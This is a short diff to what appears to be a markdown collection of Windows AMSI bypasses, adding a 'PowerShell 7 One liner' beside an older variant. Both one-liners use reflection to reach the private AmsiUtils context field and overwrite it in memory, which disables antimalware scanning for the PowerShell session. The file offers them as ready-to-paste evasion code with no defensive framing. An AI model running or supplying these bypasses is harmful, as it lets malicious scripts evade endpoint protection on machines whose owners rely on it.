@@ -2,7 +2,12 @@
 
 # DEC 2025 UPDATE
 
-## One liner
+## PowerShell 7 One liner
+```
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('s_amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0)
+```
+
+## < PowerShell 7 One liner
 ```
 $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0)
 ```
